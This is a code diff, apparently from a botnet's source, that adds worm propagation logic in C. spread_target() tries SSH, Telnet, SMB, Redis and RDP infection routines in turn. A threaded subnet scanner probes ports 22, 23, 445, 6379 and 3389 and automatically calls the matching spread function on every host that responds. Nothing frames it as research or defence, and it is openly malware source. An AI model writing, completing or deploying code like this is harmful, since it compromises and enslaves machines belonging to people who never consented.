@@ -1926,6 +1926,151 @@ char *scan_ports(const char *target, uint16_t *ports, int port_count) {
     return result;
 }
 
+/* ── Spread to a specific target ──────────────────────── */
+/* Implements spread_target() declared in spread.h (#73).
+ * Dispatches based on target->service (SPREAD_* mask). */
+int spread_target(notnet_bot_t *bot, notnet_target_t *target) {
+    if (!bot || !target) return -1;
+
+    log_info("spread_target: %s:%d service=0x%02x",
+             target->ip, target->port, target->service);
+
+    if (target->service & SPREAD_SSH) {
+        if (spread_ssh(bot, target->ip, target->port) == 0) return 0;
+    }
+    if (target->service & SPREAD_TELNET) {
+        if (spread_telnet(bot, target->ip, target->port) == 0) return 0;
+    }
+    if (target->service & SPREAD_SMB) {
+        if (spread_smb(bot, target->ip, target->port) == 0) return 0;
+    }
+    if (target->service & SPREAD_REDIS) {
+        if (spread_redis(bot, target->ip, target->port) == 0) return 0;
+    }
+    if (target->service & SPREAD_RDP) {
+        if (spread_rdp(bot, target->ip, target->port) == 0) return 0;
+    }
+
+    return -1;
+}
+
+/* ── Threaded scanning ────────────────────────────────── */
+/* Thread argument: base IP index, count, bot pointer, service mask */
+#include <pthread.h>
+
+typedef struct {
+    notnet_bot_t *bot;
+    uint32_t host_ip;
+    int start;
+    int count;
+    uint8_t service_mask;
+} scan_thread_arg_t;
+
+static void *scan_thread_fn(void *arg) {
+    scan_thread_arg_t *a = (scan_thread_arg_t *)arg;
+    notnet_bot_t *bot = a->bot;
+
+    int timeout = SCAN_TIMEOUT_MS;
+    if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;
+
+    for (int i = a->start; i < a->start + a->count; i++) {
+        uint32_t ip = a->host_ip + i;
+        char ip_str[16];
+        snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d",
+                 (ip >> 24) & 0xFF, (ip >> 16) & 0xFF,
+                 (ip >> 8) & 0xFF, ip & 0xFF);
+
+        if (a->service_mask & SPREAD_SSH) {
+            if (scan_port_with_timeout(ip_str, 22, timeout) == 0) {
+                spread_ssh(bot, ip_str, 22);
+            }
+        }
+        if (a->service_mask & SPREAD_TELNET) {
+            if (scan_port_with_timeout(ip_str, 23, timeout) == 0) {
+                spread_telnet(bot, ip_str, 23);
+            }
+        }
+        if (a->service_mask & SPREAD_SMB) {
+            if (scan_port_with_timeout(ip_str, 445, timeout) == 0) {
+                spread_smb(bot, ip_str, 445);
+            }
+        }
+        if (a->service_mask & SPREAD_REDIS) {
+            if (scan_port_with_timeout(ip_str, 6379, timeout) == 0) {
+                spread_redis(bot, ip_str, 6379);
+            }
+        }
+        if (a->service_mask & SPREAD_RDP) {
+            if (scan_port_with_timeout(ip_str, 3389, timeout) == 0) {
+                spread_rdp(bot, ip_str, 3389);
+            }
+        }
+    }
+
+    return NULL;
+}
+
+/* Implements spawn_scan_threads() declared in spread.h (#73).
+ * Splits a /24 subnet across SCAN_THREAD_COUNT threads. */
+int spawn_scan_threads(notnet_bot_t *bot, const char *subnet, uint8_t service_mask) {
+    /* Parse subnet same as scan_subnet */
+    char net[16], mask[4] = {0};
+    if (sscanf(subnet, "%15[^/]/%3s", net, mask) < 2) {
+        log_error("spawn_scan_threads: invalid subnet '%s'", subnet);
+        return -1;
+    }
+    int prefix = atoi(mask);
+    if (prefix < 16 || prefix > 32) {
+        log_error("spawn_scan_threads: prefix %d out of range", prefix);
+        return -1;
+    }
+
+    struct in_addr in;
+    if (inet_pton(AF_INET, net, &in) != 1) {
+        log_error("spawn_scan_threads: invalid IP %s", net);
+        return -1;
+    }
+
+    uint32_t host_ip = ntohl(in.s_addr);
+    int hosts = (1 << (32 - prefix)) - 2;
+    if (hosts > 254) hosts = 254;
+    if (hosts < 1) hosts = 1;
+
+    int threads = SCAN_THREAD_COUNT;
+    if (threads > hosts) threads = hosts;
+    if (threads < 1) threads = 1;
+
+    log_info("spawn_scan_threads: %d threads for %d hosts", threads, hosts);
+
+    int per_thread = (hosts + threads - 1) / threads;
+    pthread_t tid[SCAN_THREAD_COUNT];
+    scan_thread_arg_t args[SCAN_THREAD_COUNT];
+
+    for (int t = 0; t < threads; t++) {
+        args[t].bot = bot;
+        args[t].host_ip = host_ip;
+        args[t].start = t * per_thread + 1;
+        args[t].count = per_thread;
+        /* clip last thread to actual remaining hosts */
+        if (t == threads - 1) {
+            args[t].count = hosts - (t * per_thread);
+        }
+        args[t].service_mask = service_mask;
+
+        if (pthread_create(&tid[t], NULL, scan_thread_fn, &args[t]) != 0) {
+            log_error("spawn_scan_threads: pthread_create failed");
+            break;
+        }
+    }
+
+    /* Wait for all threads */
+    for (int t = 0; t < threads; t++) {
+        pthread_join(tid[t], NULL);
+    }
+
+    return 0;
+}
+
 int spread_local(notnet_bot_t *bot) {
     log_info("Local spread cycle started");
     
